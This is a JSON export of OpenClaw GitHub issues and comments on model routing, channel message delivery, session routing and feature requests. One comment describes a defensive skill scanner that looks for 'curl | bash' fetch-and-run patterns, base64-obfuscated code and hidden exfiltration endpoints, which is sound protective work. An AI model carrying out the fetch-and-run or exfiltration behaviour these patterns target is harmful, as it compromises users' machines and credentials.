      "labels": [
        "bug",
        "security"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "discord"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3867099583,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11829#issuecomment-3867099583",
          "createdAt": "2026-02-08T12:34:04Z",
          "updatedAt": "2026-02-08T12:34:04Z",
          "author": "jmkritt",
          "body": "## Update: Comprehensive Solution Already Exists\n\nFound **PR #9271** — a zero-trust secure gateway that addresses this comprehensively:\n\n- Gateway runs in Docker with NO access to secrets\n- Host-side proxy holds all credentials\n- Placeholders (`{{CONFIG:...}}`, `{{OAUTH:...}}`, `{{ENV:...}}`) replaced at network edge\n- Even a fully compromised container cannot extract API keys\n\nThis is the proper Layer 2 solution, already built and tested.\n\n**Recommendation:** Prioritize merging #9271. It solves the core problem.\n\nOur user isolation workaround (github.com/jmkritt/openclaw-secrets-hardening) remains useful for users who can't run Docker or want protection today while waiting for #9271 to merge."
        },
        {
          "id": 3882079968,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11829#issuecomment-3882079968",
          "createdAt": "2026-02-11T04:42:15Z",
          "updatedAt": "2026-02-11T04:42:15Z",
          "author": "aerouser",
          "body": "Great initiative! We've been working on a similar problem with **ClawShield** - a security scanner for OpenClaw skills - and would love to share our approach.\n\n**Our experience:**\n\n1. **Skill Validation** - We scan skills before installation for:\n   - Base64 obfuscation hiding malicious code\n   - `curl | bash` patterns\n   - Suspicious IP downloads\n   - Hidden exfiltration endpoints\n   → This has already blocked malware (see our case study on nanopdf malware detection)\n\n2. **Sandboxed Execution** - Contain risky operations in isolated environments\n\n3. **API Key Isolation** - Each skill gets its own credential scope\n\n**What we learned:**\n- **Prevention > Detection** - Catching malicious skills BEFORE install is critical\n- **Pattern matching** - Most attacks use similar obfuscation techniques\n- **Community vigilance** - Sharing threat intelligence across deployments\n\n**Possible collaboration:**\nWould you be interested in integrating ClawShield's validation into the OpenClaw security roadmap? We currently protect 100+ agent deployments and could provide:\n- Skill security scanning API\n- Threat intelligence sharing\n- Best practices documentation\n\nHappy to discuss further! 🔒"
        }
      ]
    },
    {
      "number": 6671,
      "title": "Sub-agent model override not working for custom providers",
      "body": "## Description\nSub-agents always fall back to the main agent's model (anthropic/claude-opus-4-5) instead of using the configured `agents.defaults.subagents.model` or the explicit `model` parameter in `sessions_spawn`.\n\n## Environment\n- OpenClaw version: 2026.1.30 (76b5208)\n- Platform: macOS (Darwin 25.2.0, arm64)\n- Node: v22.22.0\n\n## Configuration\nCustom provider configured for local vLLM server:\n```json\n{\n  \"models\": {\n    \"mode\": \"merge\",\n    \"providers\": {\n      \"spark\": {\n        \"baseUrl\": \"http://192.168.100.2:8000/v1\",\n        \"apiKey\": \"sk-local\",\n        \"api\": \"openai-completions\",\n        \"models\": [{\n          \"id\": \"/models/gpt-oss-120b\",\n          \"name\": \"GPT-OSS 120B (vLLM)\",\n          \"reasoning\": true,\n          \"input\": [\"text\"],\n          \"cost\": {\"input\": 0, \"output\": 0, \"cacheRead\": 0, \"cacheWrite\": 0},\n          \"contextWindow\": 8192,\n          \"maxTokens\": 4096\n        }]\n      }\n    }\n  },\n  \"agents\": {\n    \"defaults\": {\n      \"subagents\": {\n        \"model\": \"spark//models/gpt-oss-120b\"\n      }\n    }\n  }\n}\n```\n\n## Steps to Reproduce\n1. Configure a custom provider as shown above\n2. Verify the endpoint works: `curl http://192.168.100.2:8000/v1/models` returns the model\n3. Spawn a sub-agent with explicit model:\n   ```\n   sessions_spawn(\n     task: \"What model are you?\",\n     model: \"spark//models/gpt-oss-120b\"\n   )\n   ```\n4. Check the sub-agent transcript\n\n## Expected Behavior\nSub-agent should use the specified model (`spark//models/gpt-oss-120b`)\n\n## Actual Behavior\nSub-agent transcript shows:\n```json\n{\"type\":\"model_change\",\"provider\":\"anthropic\",\"modelId\":\"claude-opus-4-5\"}\n```\n\nThe sub-agent always uses the main agent's model, ignoring both:\n- `agents.defaults.subagents.model` config\n- Explicit `model` parameter in `sessions_spawn`\n\n## Additional Notes\n- The `sessions_spawn` response shows `\"modelApplied\": true` but the transcript confirms the wrong model\n- Custom provider does NOT appear in `openclaw models list` output (only shows anthropic/claude-opus-4-5)\n- Direct curl to the vLLM endpoint works fine\n- Heartbeat model config (`agents.defaults.heartbeat.model`) appears to have the same issue\n\n## Workaround\nCurrently using shell scripts that call the vLLM endpoint directly via curl, bypassing OpenClaw's model routing for background tasks.",
      "state": "closed",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6671",
      "createdAt": "2026-02-01T22:59:06Z",
      "updatedAt": "2026-02-11T04:41:59Z",
      "author": "Arlandw",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3832650831,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6671#issuecomment-3832650831",
          "createdAt": "2026-02-02T02:59:50Z",
          "updatedAt": "2026-02-02T02:59:50Z",
          "author": "Arlandw",
          "body": "## Resolution: User Configuration Error (Not a Bug)\n\nAfter extensive debugging with debug logging in the model selection and fallback code paths, I found the **actual cause**:\n\n### Root Cause\nThe custom provider's `contextWindow` was set to 8192 tokens, but OpenClaw enforces a **minimum context window of 16000 tokens**. This caused the model to be rejected with:\n\n```\nModel context window too small (8192 tokens). Minimum is 16000.\n```\n\nThe fallback system then correctly tried the next candidate (default model), making it appear as though the model override wasn't being applied.\n\n### The Fix\nUpdated `~/.openclaw/agents/main/agent/models.json`:\n```json\n\"contextWindow\": 131072  // was: 8192\n```\n\n### Verification\nAfter fixing the context window:\n- `sessions_spawn` with `model: \"spark//models/gpt-oss-120b\"` now correctly runs on the Spark provider\n- Session store shows `modelProvider: \"spark\", model: \"/models/gpt-oss-120b\"`\n\n### Debug Process (for future reference)\n1. Added logging to `agentCommand` model selection → confirmed override WAS being applied\n2. Added logging to `runWithModelFallback` → confirmed Spark was first candidate\n3. Added logging to fallback error handling → found the 16000 token minimum error\n\n### Recommendation\nConsider adding a more visible warning when a model is rejected due to context window size, as this can be confusing when the model override appears in the session store but the fallback model is actually used.\n\n---\n\n**Closing as user error.** The model selection logic is working correctly. Thanks for the great fallback system!"
        },
        {
          "id": 3832650990,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6671#issuecomment-3832650990",
          "createdAt": "2026-02-02T02:59:55Z",
          "updatedAt": "2026-02-02T02:59:55Z",
          "author": "Arlandw",
          "body": "Closing as this was a configuration issue (context window too small), not a code bug. See comment above for full resolution."
        },
        {
          "id": 3882079449,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6671#issuecomment-3882079449",
          "createdAt": "2026-02-11T04:41:58Z",
          "updatedAt": "2026-02-11T04:41:58Z",
          "author": "aerouser",
          "body": "Confirming this also affects DeepSeek provider.\n\n**Our config:**\n```json\n\"agents\": {\n  \"defaults\": {\n    \"heartbeat\": {\n      \"model\": \"deepseek/deepseek-chat\",\n      \"every\": \"30m\"\n    }\n  }\n}\n```\n\n**Observed behavior:**\n- Gateway reports `modelApplied: true` for deepseek/deepseek-chat\n- Actual sessions show `provider: moonshot, modelId: kimi-k2.5`\n- OpenClaw version: 2026.2.9\n\nWe tried gateway restart but the issue persists. The heartbeat continues to use the primary session model (Kimi) instead of the configured DeepSeek.\n\n**Impact:**\n- Expected savings: ~$115/month with DeepSeek for heartbeats\n- Actual cost: Full Kimi pricing (~$695/month)\n\nHappy to provide more logs or test any fixes!"
        }
      ]
    },
    {
      "number": 12474,
      "title": "Feature request: coalesce mid-turn text blocks before sending to channel",
      "body": "## Problem\n\nWhen an agent does multi-step work (browser automation, API calls, etc.), it often produces text between tool calls in the agentic loop. Each text block gets sent as a **separate message** to the channel (e.g., Telegram), creating confusing spam for the end user.\n\nFor example, an agent doing browser automation might produce:\n1. \"Let me check the page...\" → **message 1 sent**\n2. (browser snapshot tool call)\n3. \"I see the form, clicking submit...\" → **message 2 sent**\n4. (browser click tool call)\n5. \"Done! Here's the result.\" → **message 3 sent**\n\nThe user only wants message 3 — the final result.\n\n## Current Workarounds\n\n- **SOUL.md instructions**: Telling the agent \"never narrate tool calls, only produce text at the end\" works ~70% of the time, but LLMs still produce intermediate text unpredictably.\n- **`streamMode: \"partial\"`** only affects draft streaming (Telegram typing bubble), not multi-message delivery.\n- **`blockStreamingBreak: \"message_end\"`** only applies within a single assistant message, not across the agentic tool loop.\n\n## Proposed Solution\n\nA config option to **buffer/coalesce all text blocks within a single agentic turn** (from user message to final assistant response) and only deliver the last text block (or all blocks merged) as one channel message.\n\nSomething like:\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"channelDelivery\": \"final-only\"\n    }\n  }\n}\n```\n\nOr per-channel:\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"coalesceAgentTurns\": true\n    }\n  }\n}\n```\n\nOptions could include:\n- `\"final-only\"`: Only send the last text block from the agentic turn\n- `\"coalesce\"`: Merge all text blocks into one message\n- `\"all\"` (current default): Send each text block as a separate message\n\n## Environment\n\n- OpenClaw 2026.2.6-3\n- Telegram channel with `streamMode: \"partial\"`\n- Multi-agent setup (main agent + sub-agent)\n- Claude Opus 4.6 model",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12474",
      "createdAt": "2026-02-09T08:59:12Z",
      "updatedAt": "2026-02-11T04:40:08Z",
      "author": "tunamitom",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3874778204,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12474#issuecomment-3874778204",
          "createdAt": "2026-02-10T01:19:30Z",
          "updatedAt": "2026-02-10T01:28:25Z",
          "author": "jamesdwilson",
          "body": "## Real-world impact report — daily Telegram user\n\n**My setup:** OpenClaw 2026.2.6-3, Opus 4.6, Telegram DM channel, `streamMode: \"off\"`, `blockStreamingBreak: \"message_end\"`\n\n### The problem\n\nWhen my agent makes sequential tool calls (common pattern: multiple `Edit` calls to update files, or `exec` → `Edit` → `exec` chains), every text fragment between tool calls gets delivered as a **separate Telegram message**. I've flagged this to my agent 10+ times in 4 days. It's the single biggest UX complaint I have with the platform.\n\n### What gets leaked\n\nReal examples from today alone:\n```\n\"Now let me apply all of James's confirmations:\"\n\"Now update the Other Expenses to remove Flickr and add Indochino, and fix DreamHost note:\"\n\"Now add Indochino as a new line item under Travel (clothing for conference):\"\n\"Now update the summary table and missing items:\"\n\"Now push:\"\n```\n\nEach of those arrived as a separate Telegram message. I saw **8 narration messages** before the actual result. On my phone, that's 8 notification buzzes of garbage.\n\n### The core issue\n\nThese intermediate text blocks are **not intended for the user**. They're the model thinking out loud between tool calls — narration of its own process. They have zero informational value and should never reach the channel at all.\n\nThis is fundamentally different from the agent's final response. The final text block after all tool calls complete is the actual reply. Everything before it is internal narration that the model produces due to RLHF training patterns, not because it's trying to communicate with me.\n\n### Two problems, not one\n\n**1. UX pollution:** 8 notification buzzes of narration before I get the actual answer. Unusable on mobile.\n\n**2. Context window waste:** Every narration fragment that gets sent to the channel also stays in the conversation history. Over a session with dozens of tool-call chains, hundreds of tokens of \"Now let me...\" filler accumulate in context. That's context window budget being burned on content that has zero value for either the user or the model's future reasoning. On long sessions this accelerates compaction cycles and pushes out actual useful conversation history sooner.\n\n### Config that does NOT help\n\n```json\n{\n  \"channels\": { \"telegram\": { \"streamMode\": \"off\" } },\n  \"agents\": { \"defaults\": { \"blockStreamingBreak\": \"message_end\" } }\n}\n```\n\n- `streamMode: \"off\"` only suppresses typing-preview draft streaming\n- `blockStreamingBreak: \"message_end\"` only applies within a single assistant message, not across the agentic tool loop\n\nNeither prevents intermediate text content blocks from the Anthropic API's tool-use response from being forwarded as individual channel messages.\n\n### Root cause (confirmed via code review)\n\nThe agentic loop processes each content block from the API response sequentially. When Claude returns:\n```\n[text_block] → [tool_use_block] → [text_block] → [tool_use_block] → [text_block]\n```\n\nEach `text_block` is dispatched to the channel as a standalone message. There's no concept of \"this is internal narration vs. the actual response.\"\n\n### Why prompt engineering isn't sufficient\n\nThe system prompt already says \"do not narrate routine, low-risk tool calls.\" This works ~70% of the time, but:\n1. LLMs unpredictably produce transitional text — it's deeply baked into RLHF training\n2. Even Opus 4.6 with explicit `ZERO prose between tool calls` instructions still leaks ~30% of the time\n3. The failure mode is completely invisible to the model — it has no feedback that these fragments reach me\n4. I've resorted to delegating multi-step work to sub-agents just to avoid this, which shouldn't be necessary for simple sequential edits\n\n### Proposed solution\n\nMid-turn text blocks should be **suppressed entirely by default**, not coalesced or buffered. Only the final text block (after all tool calls complete) should be delivered to the channel:\n\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"agentTurnDelivery\": \"final-only\"\n    }\n  }\n}\n```\n\nBehavior: During an agentic tool loop, **discard** all intermediate text content blocks — both from channel delivery AND from persisted conversation history. When the turn completes (final assistant message with no pending tool calls), deliver only that final response. The intermediate narration never existed as far as the user or context window is concerned.\n\nOptionally, a `\"coalesce\"` mode could concatenate everything for users who want verbose output — but the default should be suppression, not delivery.\n\n### Workaround I'm using\n\nDelegating multi-step work to sub-agents via `sessions_spawn`. Their intermediate narration stays contained in the sub-agent session. Only the final result returns to the main session. This works but adds latency and complexity for what should be simple sequential edits.\n\n### My environment\n- OpenClaw: 2026.2.6-3\n- Model: anthropic/claude-opus-4-6\n- Channel: Telegram (DM, allowlist)\n- OS: macOS Darwin 25.3.0 (arm64), M3 Max\n- Config: streamMode off, blockStreamingBreak message_end, heartbeat 60m"
        },
        {
          "id": 3882075798,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12474#issuecomment-3882075798",
          "createdAt": "2026-02-11T04:40:08Z",
          "updatedAt": "2026-02-11T04:40:08Z",
          "author": "lobsterlad",
          "body": "Experiencing this as well on 2026.2.9 with Discord channel. The agent produces intermediate narration between tool calls (e.g., \"Now update X...\", \"Let me check Y...\") and each text block gets sent as a separate message. This is especially noisy during multi-step code editing tasks.\n\nThe `coalesceAgentTurns` / `final-only` option proposed here would be great. As a data point, adding instructions like \"don't narrate tool calls\" in the system prompt helps but isn't reliable."
        }
      ]
    },
    {
      "number": 13880,
      "title": "resolveFallbackSession() discards threadId — breaks topic isolation for plugin-based channels",
      "body": "## Problem\n\n`resolveFallbackSession()` in `outbound-session.js` does not use the `threadId` parameter, even though it is passed via `resolveOutboundSessionRoute()`. This breaks topic isolation for any channel that uses the fallback session resolver (i.e., all plugin-based channels like Feishu).\n\n## Impact\n\nWhen a sub-agent (`sessions_spawn`) delivers results to a Feishu topic group:\n1. The announce flow correctly passes `threadId` (the topic's root message ID)\n2. `resolveOutboundSessionRoute()` dispatches to `resolveFallbackSession()` for Feishu (no dedicated resolver)\n3. `resolveFallbackSession()` ignores `threadId` entirely\n4. The resulting route has no `threadId` → outbound adapter sends without reply context → Feishu creates a new topic\n\nBuilt-in channels like Telegram have dedicated resolvers (`resolveTelegramSession`) that handle `threadId` and encode it into the peer ID. Plugin-based channels fall through to `resolveFallbackSession` which doesn't.\n\n## Expected behavior\n\n`resolveFallbackSession()` should:\n1. Accept and forward `threadId` in the returned route object\n2. Encode `threadId` into the peer ID for group/channel contexts (e.g., `peerId:topic:threadId`) so the session key is topic-scoped\n\n## Suggested fix\n\n```javascript\nfunction resolveFallbackSession(params) {\n    // ... existing code ...\n    \n    const threadId = normalizeThreadId(params.threadId);\n    const topicAwarePeerId = threadId && peerKind !== \"dm\"\n        ? `${peerId}:topic:${threadId}`\n        : peerId;\n    const peer = { kind: peerKind, id: topicAwarePeerId };\n    \n    // ... build session key with topic-aware peer ...\n    \n    return {\n        sessionKey: baseSessionKey,\n        baseSessionKey,\n        peer,\n        chatType,\n        from,\n        to: `${toPrefix}:${peerId}`,\n        threadId,  // forward to outbound adapter\n    };\n}\n```\n\n## Context\n\n- Related Feishu plugin PR: https://github.com/m1heng/clawdbot-feishu/pull/232\n- The plugin-side fix (propagating `MessageThreadId` from inbound + using `threadId` in the outbound adapter) is necessary but not sufficient — without the core fix, `threadId` never reaches the adapter for fallback-resolved channels.\n- Telegram is not affected because it has a dedicated `resolveTelegramSession()` that handles this correctly.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13880",
      "createdAt": "2026-02-11T04:39:56Z",
      "updatedAt": "2026-02-11T04:39:56Z",
      "author": "4ier",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 12768,
      "title": "Gateway Restart Notification Issue",
      "body": "# Gateway Restart Notification Issue\n\n## Problem\n\nCurrently, when Gateway restarts, there is no notification mechanism to inform users whether the restart succeeded or failed.\n\n## Current Situation\n\n1. **Telegram & WhatsApp**: When Gateway restarts, users see their message was sent but receive no response. The app shows the message in \"sending...\" or \"pending\" state indefinitely. Users dont know if:\n   - Gateway is still restarting\n   - Gateway failed to restart\n   - Service is back online\n   \n2. **User Experience**: Users are left in confusion, waiting for a response that may never come.\n\n## Pain Points\n\n1. **No Feedback**: Users have no way to know if Gateway restart was successful or failed.\n\n2. **Stuck State**: Telegram and WhatsApp show messages in pending/sending state, giving users no indication of what happened.\n\n3. **Poor Experience**: Users dont know when they can start sending messages again.\n\n## Suggestion\n\nIf Gateway restarts successfully and Agent is ready, send a notification to the chat channel to inform users:\n- Restart successful\n- Service is ready\n- Users can continue conversation\n\nThis will greatly improve user experience.\n\n## Environment\n\n- OpenClaw Version: 2026.2.6-3\n- OS: Ubuntu 24.04.3 LTS\n- Channels: Feishu, WhatsApp, Telegram\n\n---\n\nThank you!",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12768",
      "createdAt": "2026-02-09T16:59:06Z",
      "updatedAt": "2026-02-11T04:39:55Z",
      "author": "Utopian-wxp",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882075382,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12768#issuecomment-3882075382",
          "createdAt": "2026-02-11T04:39:55Z",
          "updatedAt": "2026-02-11T04:39:55Z",
          "author": "weny911",
          "body": "When will this problem be resolved?"
        }
      ]
    },
    {
      "number": 13871,
      "title": "Feature Request: Browser-based VAD/STT voice input in Control UI WebChat",
      "body": "## Summary\n\nAdd a microphone button with Voice Activity Detection (VAD) and Speech-to-Text (STT) to the Control UI's WebChat, enabling voice input directly from the browser.\n\n## Problem\n\nCurrently, voice input (Talk mode with VAD auto-detect) only works on native apps (macOS, iOS, Android). The browser-based Control UI at `localhost:18789` is text-only. Users on Windows or Linux who primarily use the web UI have no voice input option.\n\n## Proposed Solution\n\nAdd a mic toggle button to the chat input area that:\n\n1. **VAD auto-detect** — Uses a library like `@ricky0123/vad-web` (MIT, ~50KB) to detect speech start/end automatically\n2. **STT transcription** — Sends recorded audio to the configured STT provider (Groq Whisper, Deepgram, etc.) via the Gateway\n3. **Auto-send or paste** — Transcribed text either auto-sends or populates the input field for review\n4. **Visual feedback** — Listening/processing state indicators (similar to native Talk mode)\n\n### Implementation notes\n\n- Could use the existing `messages.stt` or `hooks.internal.entries` config for STT provider settings\n- Web Speech API is an alternative but less accurate and not available in all browsers\n- VAD approach is preferred over push-to-talk for hands-free use\n- Should respect the same TTS config (`messages.tts`) for full voice loop\n\n## Alternatives Considered\n\n- **Browser extension** — Would break on every OpenClaw update since bundled filenames change\n- **Userscript injection** — Same fragility issue\n- **Telegram voice notes** — Works but requires switching apps\n\n## Environment\n\n- OpenClaw 2026.2.9\n- Windows (browser-only user)\n- Control UI (Vite + Lit)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13871",
      "createdAt": "2026-02-11T04:25:47Z",
      "updatedAt": "2026-02-11T04:25:47Z",
      "author": "Mundoai",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos",
          "windows",
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13870,
      "title": "Feature Request: Human-friendly device names in paired devices list",
      "body": "## Problem\n\nThe paired devices list in the web UI (and CLI via `openclaw devices list`) displays devices using long cryptographic hash IDs (e.g., `c5f3ba123c4b008a9dd3b29cd21b2c21ae2e3f...`). With multiple devices paired (phones, laptops, desktops, web UI sessions), it's nearly impossible to tell which device is which without digging into the raw JSON.\n\n## Proposed Solution\n\nAllow users to assign a human-friendly name/label to paired devices, e.g.:\n- \"Mac Studio\"\n- \"Michael's iPhone\"  \n- \"MacBook Pro\"\n- \"iPad\"\n\nThis could be:\n1. A `displayName` field in the paired device record\n2. Settable via CLI: `openclaw devices rename --device <id> --name \"Mac Studio\"`\n3. Displayed in the web UI Devices/Nodes panel alongside (or instead of) the hash ID\n\n## Additional Context\n\n- Platform info (`darwin`, `MacIntel`, `iPhone`) is already captured but not prominently shown\n- Client mode (`webchat`, `node`, etc.) helps but isn't enough when you have multiple devices of the same type\n- Currently the only way to identify a device is to cross-reference the hash ID in `paired.json` with `device.json` on each machine",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13870",
      "createdAt": "2026-02-11T04:21:17Z",
      "updatedAt": "2026-02-11T04:21:17Z",
      "author": "koome23",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 12787,
      "title": "[Feature]: Slack Indicator when typing",
      "body": "Slack doesn't show an indicator when typing, it works best on Discord, says the name of your bot is typing and shows eyes to indicate its working.\n\nOn slack there's nothing.  I want to know my bot is doing something vs, no clue if it's working. \n\n\nWhen you post, mention:\nYou want Slack typing indicators (like Google Chat has with typingIndicator: \"message\")\nThe config currently rejects typingIndicator as an unrecognized key for Slack\nReference the channels.slack.typingIndicator config option that works for Google Chat\nQuick copy-paste for the issue:\nFeature Request: Slack typing indicator support\nGoogle Chat supports typingIndicator: \"message\" in the channel config. Would love the same for Slack so users see when the bot is processing a response.\nCurrently channels.slack.typingIndicator throws \"Unrecognized key\" validation error.\nThat's the cleanest path. 🎯",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12787",
      "createdAt": "2026-02-09T17:42:11Z",
      "updatedAt": "2026-02-11T04:20:36Z",
      "author": "dcrowder147",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "discord",
          "slack",
          "googlechat"
        ],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3873155476,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12787#issuecomment-3873155476",
          "createdAt": "2026-02-09T18:06:57Z",
          "updatedAt": "2026-02-09T18:06:57Z",
          "author": "supermomonga",
          "body": "I think we can use `assistant.threads.setStatus` method to do this.\n\nYou can see example video in Bolt SDK's release note here:\nhttps://github.com/slackapi/bolt-js/releases/tag/%40slack%2Fbolt%404.5.0"
        },
        {
          "id": 3882037472,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12787#issuecomment-3882037472",
          "createdAt": "2026-02-11T04:20:36Z",
          "updatedAt": "2026-02-11T04:20:36Z",
          "author": "tony-sn",
          "body": "> I think we can use `assistant.threads.setStatus` method to do this.\n> \n> You can see example video in Bolt SDK's release note here: https://github.com/slackapi/bolt-js/releases/tag/%40slack%2Fbolt%404.5.0\n\nThis works, but I believe it turns Openclaw Slack app to become an AI Agent App, first, a pro feature that will bring the cost of Pro users, and second it answers in thread style, not DM style anymore and it really annoys me when I need to find openclaw's answer. I prefer the DM chat interface\n\n<img width=\"831\" height=\"654\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/07f12cff-7fe3-43ac-9628-bfd2bc6301c8\" />\n\n<img width=\"540\" height=\"305\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/275fb68e-cc4b-4df3-81ee-e4cf83dd934b\" />\n\n"
        }
      ]
    },
    {
      "number": 13869,
      "title": "LINE plugin: multi-account webhook routing ignores accountId binding — all DMs route to default agent",
      "body": "## Summary\n\nWhen using the LINE plugin with multiple accounts (`channels.line.accounts`), inbound DMs to a secondary LINE bot are correctly received on the secondary webhook path (e.g. `/line/secondary`) but are routed to the **default agent** (`agent:main:main`) instead of the bound agent.\n\n## Environment\n\n- **Version:** 2026.2.9 (commit `8d75a49`)\n- **OS:** macOS (arm64)\n- **Node:** v24.5.0\n- **LINE plugin:** loaded from local extension (`extensions/line`)\n- **Setup:** Cloudflare Tunnel → `localhost:18789`\n\n## Config (redacted)\n\n```json5\n{\n  agents: {\n    list: [\n      { id: \"main\", name: \"Primary\" },\n      { id: \"secondary\", name: \"Secondary\", workspace: \"~/.openclaw/workspace-secondary\" },\n    ],\n  },\n  bindings: [\n    {\n      agentId: \"secondary\",\n      match: { channel: \"line\", accountId: \"secondary\" },\n    },\n  ],\n  channels: {\n    line: {\n      enabled: true,\n      channelSecret: \"...\",\n      channelAccessToken: \"...\",\n      accounts: {\n        secondary: {\n          enabled: true,\n          channelSecret: \"...\",\n          channelAccessToken: \"...\",\n          webhookPath: \"/line/secondary\",\n          agentId: \"secondary\",\n          dmPolicy: \"open\",\n        },\n      },\n    },\n  },\n}\n```\n\n## What works\n\n- ✅ Both LINE providers start correctly (logs show `[default]` and `[secondary]` starting)\n- ✅ Both webhook paths are registered and respond to POST requests (`/line/webhook` and `/line/secondary` both return `{\"error\":\"Invalid signature\"}` for invalid requests)\n- ✅ `listLineAccountIds()` returns `[\"default\", \"secondary\"]`\n- ✅ `resolveLineAccount({ cfg, accountId: \"secondary\" })` correctly resolves the secondary account\n- ✅ `resolveAgentRoute` unit tests pass (20/20)\n- ✅ The secondary bot's token is used for replies (reply appears in the secondary bot's chat, not the default bot's)\n- ✅ Secondary agent workspace exists with all required files\n\n## What doesn't work\n\n- ❌ When sending a DM to the secondary LINE bot, the session is created as `agent:main:main` with `accountId: \"default\"`\n- ❌ No session is created under `agent:secondary:*` (sessions.json remains `{}`)\n- ❌ The secondary agent's persona/workspace is never loaded — the default agent responds instead\n- ❌ `dmPolicy: \"open\"` on the secondary account has no effect on routing\n\n## Key observation\n\nThe reply comes from the **secondary bot's LINE account** (correct token is used for the push/reply API call), but the **session and agent resolution** falls back to `agent:main:main`. This suggests the `accountId` is correctly passed to the LINE API client for sending replies, but is **not correctly propagated to `resolveAgentRoute()`** during inbound message processing.\n\n## Steps to reproduce\n\n1. Configure two LINE Messaging API channels (two separate LINE bots)\n2. Set up `agents.list` with two agents\n3. Add `bindings` matching `channel: \"line\", accountId: \"secondary\"` to the secondary agent\n4. Configure `channels.line.accounts.secondary` with the second bot's credentials and `webhookPath: \"/line/secondary\"`\n5. Set LINE Developer Console webhook URL for the secondary bot to `https://<host>/line/secondary`\n6. Send a DM to the secondary LINE bot\n7. **Expected:** Session created as `agent:secondary:main`, secondary agent's persona responds\n8. **Actual:** Session created as `agent:main:main`, default agent responds (but reply comes from secondary bot's LINE account)\n\n## Debugging done\n\n- Verified Cloudflare Tunnel forwards `/line/secondary` path correctly\n- Confirmed both webhook handlers are registered at separate HTTP paths\n- Tested `resolveAgentRoute` logic directly — code is correct for `accountId` matching\n- Enabled debug logging — no additional routing info captured\n- Changed `dmPolicy` to `\"open\"` — no effect\n- Checked `~/.openclaw/agents/secondary/sessions/sessions.json` — remains empty `{}`\n\n## Suspected cause\n\nThe `accountId` may be lost or reset to `\"default\"` somewhere between:\n1. The HTTP handler receiving the webhook on `/line/secondary` (correct path)\n2. The `buildLineMessageContext()` call that feeds `resolveAgentRoute()`\n\nThe LINE API client correctly uses the secondary account's token (replies appear in the right chat), but the routing/session layer doesn't see `accountId: \"secondary\"`.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13869",
      "createdAt": "2026-02-11T04:20:28Z",
      "updatedAt": "2026-02-11T04:20:28Z",
      "author": "ryuta-fit",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13868,
      "title": "Provider API errors not logged in gateway.log",
      "body": "## Issue\n\nWhen a model provider returns an HTTP error (e.g., 500), OpenClaw passes the error through to the channel (Telegram) but does not log the full API response in `gateway.log`.\n\n## Example\n\n**Provider:** MiniMax  \n**Time:** 2026-02-10 23:15 EST  \n**Error returned to user:**\n```\nHTTP 500: {\"type\":\"error\",\"error\":{\"type\":\"api_error\",\"message\":\"Internal server error\"}}\n```\n\n**Gateway logs:**\n- Session start logged in `commands.log`\n- No corresponding error entry in `gateway.log` or `gateway.err.log`\n\n## Expected Behavior\n\nProvider API errors should be logged with:\n- Timestamp\n- Provider name\n- HTTP status code\n- Full response body\n- Request context (session, model, etc.)\n\n## Impact\n\nMakes debugging provider issues difficult — have to rely on Telegram message history instead of server logs.\n\n## Environment\n\n- OpenClaw running on macOS (clawd)\n- Provider: MiniMax (minimax-portal/MiniMax-M2.1)\n- Channel: Telegram",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13868",
      "createdAt": "2026-02-11T04:19:26Z",
      "updatedAt": "2026-02-11T04:19:26Z",
      "author": "jacobaross",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
